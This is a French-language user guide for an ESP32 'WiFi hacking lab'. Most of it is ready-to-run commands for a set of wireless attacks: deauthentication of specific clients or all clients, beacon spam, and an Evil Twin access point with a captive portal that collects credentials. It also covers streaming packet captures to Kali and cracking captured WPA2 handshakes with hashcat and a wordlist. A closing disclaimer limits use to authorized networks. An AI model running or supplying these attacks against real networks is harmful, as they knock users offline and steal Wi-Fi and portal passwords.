# Guide d'utilisation — ESP32 WiFi Hacking Lab

## Démarrage rapide

### 1. Connecter l'ESP32

```bash
# Vérifier le port
ls /dev/ttyUSB*   # → /dev/ttyUSB0

# Activer le venv
source "Wifi Hacking/.venv/bin/activate"
```

### 2. Déployer les fichiers

```bash
cd "Wifi Hacking"
python tools/deploy.py
```

### 3. Lancer le menu interactif

```bash
.venv/bin/mpremote connect /dev/ttyUSB0 repl
# Puis dans le REPL :
import main
```

---

## Modules — usage direct depuis le REPL

### Scanner WiFi

```python
from lib.wifi_scanner import scan, scan_loop, select

nets = scan()                  # scan unique, affiche tableau
scan_loop(interval=10)         # scans répétés toutes les 10s
cible = select(nets)           # sélection interactive
```

### Sniffer promiscuous *(firmware custom requis)*

```python
from lib.packet_sniffer import sniff

sniff(duration=30)             # 30s, hopping automatique
sniff(duration=60, channel=6)  # 60s, canal 6 fixé
```

### Probe Request sniffer *(firmware custom requis)*

```python
from lib.probe_sniffer import sniff_probes

sniff_probes(duration=60)          # capture 60s
sniff_probes(duration=0, channel=1) # infini sur canal 1
```

### Deauth attack *(firmware custom requis)*

```python
from lib.wifi_scanner import scan, select
from lib.deauth import deauth_client, deauth_broadcast, deauth_loop

nets  = scan()
cible = select(nets)

# Déconnecter un client spécifique
deauth_client(cible['bssid'], 'aa:bb:cc:dd:ee:ff', count=100)

# Déconnecter tous les clients
deauth_broadcast(cible['bssid'], count=200)

# Continu jusqu'à Ctrl+C
deauth_loop(cible['bssid'])
```

### Beacon spam *(firmware custom requis)*

```python
from lib.beacon_spam import spam_random, spam_fr, spam_clone

spam_random(channel=6)                    # SSIDs aléatoires
spam_fr(channel=1)                        # SSIDs opérateurs français
spam_clone('NomDuReseau', channel=6)      # cloner un SSID précis
```

### Evil Twin + portail captif

```python
from lib.wifi_scanner import scan, select
from lib.evil_twin import start, show_captured

nets  = scan()
cible = select(nets)

# Evil Twin simple (sans deauth)
start(cible['ssid'], channel=cible['ch'])

# Avec deauth de l'AP réel en simultané (firmware custom requis)
start(cible['ssid'], channel=cible['ch'], deauth_ap_mac=cible['bssid'])

# Voir les credentials capturés
show_captured()
```

---

## Streaming vers Kali

### Sur Kali — démarrer le receiver

```bash
# Terminal 1 : receiver
python3 tools/receiver.py

# Options
python3 tools/receiver.py --port 9999 --out captures/
```

### Sur l'ESP32 — connecter et streamer

```python
from lib.streaming import connect_ap, start

# Se connecter au hotspot Android ou au réseau Kali
connect_ap('NomDuHotspot', 'motdepasse')

# Démarrer le streaming (channel hopping automatique)
start()

# Canal fixé, durée limitée
start(duration=120, channel=6)
```

### Résultat

Le fichier `.pcap` est créé dans `captures/`. Il peut être ouvert avec :
```bash
wireshark captures/capture_*.pcap

# Crack WPA2 si handshake capturé (auto-lancé par receiver.py)
hcxpcapngtool -o hash.hc22000 captures/capture_*.pcap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## Firmware custom (promiscuous + injection)

Le firmware officiel MicroPython ne supporte pas le mode promiscuous
ni l'injection de paquets. Il faut compiler le firmware custom :

```bash
# Prérequis : Docker installé
cd "Wifi Hacking"
bash tools/build_firmware.sh
# → génère firmware/micropython-esp32-custom-wifi.bin
# → propose de flasher automatiquement
```

### Flash manuel

```bash
# 1. Effacer la flash
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 erase_flash

# 2. Flasher
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 \
    write_flash -z 0x1000 firmware/micropython-esp32-custom-wifi.bin

# 3. Redéployer les fichiers Python
python3 tools/deploy.py
```

---

## Référence rapide des modules

| Module | Fonctions principales | Firmware custom |
|---|---|---|
| `wifi_scanner` | `scan()`, `scan_loop()`, `select()` | Non |
| `packet_sniffer` | `sniff(duration, channel)` | **Oui** |
| `probe_sniffer` | `sniff_probes(duration, channel)` | **Oui** |
| `packet_builder` | `build_deauth()`, `build_beacon()`, `send()` | **Oui** |
| `deauth` | `deauth_client()`, `deauth_broadcast()`, `deauth_loop()` | **Oui** |
| `beacon_spam` | `spam_random()`, `spam_fr()`, `spam_clone()` | **Oui** |
| `evil_twin` | `start()`, `show_captured()` | Non (deauth optionnel) |
| `streaming` | `connect_ap()`, `start()` | **Oui** |
| `display` | `banner()`, `info/ok/warn/err()`, `table()` | Non |

---

## Avertissement

Ce lab est réservé à un usage **éducatif et défensif** sur des réseaux
dont vous êtes propriétaire ou pour lesquels vous avez une autorisation écrite.
